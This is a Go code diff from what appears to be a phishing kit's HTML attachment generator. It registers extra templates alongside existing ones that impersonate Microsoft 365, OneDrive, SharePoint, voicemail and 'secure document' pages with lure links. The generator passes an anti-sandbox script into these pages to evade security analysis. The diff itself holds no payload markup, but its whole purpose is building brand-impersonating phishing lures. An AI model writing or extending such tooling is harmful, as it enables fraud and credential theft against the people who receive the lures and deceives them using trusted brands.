@@ -37,7 +37,7 @@ type HTMLTemplateInfo struct {
 
 // GetHTMLTemplates returns all available HTML attachment templates
 func GetHTMLTemplates() []HTMLTemplateInfo {
-	return []HTMLTemplateInfo{
+	templates := []HTMLTemplateInfo{
 		{ID: TemplateMicrosoftDocument, Name: "Microsoft Document", Description: "Microsoft 365 document loading screen with progress bar", Category: "microsoft", Brand: "Microsoft", Icon: "📄"},
 		{ID: TemplateOneDrive, Name: "OneDrive Share", Description: "OneDrive file sharing notification with download button", Category: "microsoft", Brand: "OneDrive", Icon: "☁️"},
 		{ID: TemplateSharePoint, Name: "SharePoint File", Description: "SharePoint Online document access page", Category: "microsoft", Brand: "SharePoint", Icon: "📁"},
@@ -51,6 +51,9 @@ func GetHTMLTemplates() []HTMLTemplateInfo {
 		{ID: TemplateVoicemail, Name: "Voicemail Message", Description: "Microsoft voicemail notification with audio player", Category: "microsoft", Brand: "Microsoft", Icon: "🎤"},
 		{ID: TemplateSecureDocument, Name: "Secure Document", Description: "Encrypted secure document access with verification", Category: "security", Brand: "Security", Icon: "🔒"},
 	}
+	// Append v1.0.43 templates
+	templates = append(templates, GetHTMLTemplatesV2()...)
+	return templates
 }
 
 // HTMLTemplateRequest holds parameters for generating a branded HTML template
@@ -139,6 +142,10 @@ func (ag *AttachmentGenerator) GenerateHTMLTemplate(req *HTMLTemplateRequest) ([
 	case TemplateSecureDocument:
 		content = ag.templateSecureDocument(linkURL, docName, senderName, companyName, message, antiSandboxScript)
 	default:
+		// Try v1.0.43 templates
+		if v2Content, ok := ag.generateV2Template(req); ok {
+			return []byte(v2Content), nil
+		}
 		return nil, fmt.Errorf("unknown template: %s", req.TemplateID)
 	}
 
